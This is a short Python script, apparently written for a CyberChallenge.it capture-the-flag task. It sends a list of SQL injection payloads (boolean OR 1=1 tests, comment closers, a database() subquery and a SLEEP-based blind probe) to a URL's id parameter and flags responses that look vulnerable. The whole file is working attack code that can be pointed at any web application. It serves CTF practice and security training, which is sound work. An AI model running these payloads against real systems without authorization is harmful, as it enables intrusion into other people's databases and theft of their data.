import requests
import time

class SQLiTester:
    def __init__(self, url):
        self.url = url

    def test_payload(self, payload):
        full_url = self.url + payload
        start_time = time.time()
        response = requests.get(full_url)
        elapsed_time = time.time() - start_time
        return response.text, elapsed_time

    def run_tests(self):
        payloads = {
            "Close Query (Comment)": "1' -- ",
            "Close Query (Hash Comment)": "1' #",
            "Boolean True": "1' OR 1=1 -- ",
            "Boolean False": "1' OR 1=2 -- ",
            "String Compare": "1' OR 'a'='a' -- ",
            "Subquery Database": "1' AND (SELECT database()) -- ",
            "SQLi Blind (Sleep 5s)": "1' AND SLEEP(5) -- "
        }

        print(f"[*] Testing SQL Injection on {self.url}\n")

        for test_name, payload in payloads.items():
            print(f"[+] Testing: {test_name}")
            response_text, elapsed_time = self.test_payload(payload)

            print(f"  Response:\n{response_text[:500]}...")  # Print the first 500 characters of the response

            if "Article not found!" not in response_text:
                print(f"  ✅ {test_name} might be working!")
            else:
                print(f"  ❌ {test_name} failed.")

            if elapsed_time > 4:  # If response takes longer, it's likely time-based SQLi
                print(f"  ⏳ Possible Time-Based SQLi detected (Response Time: {elapsed_time:.2f}s)")

            print("-" * 50)

# Modifica l'URL con il tuo
target_url = "http://filtered.challs.cyberchallenge.it/post.php?id="
tester = SQLiTester(target_url)
tester.run_tests()
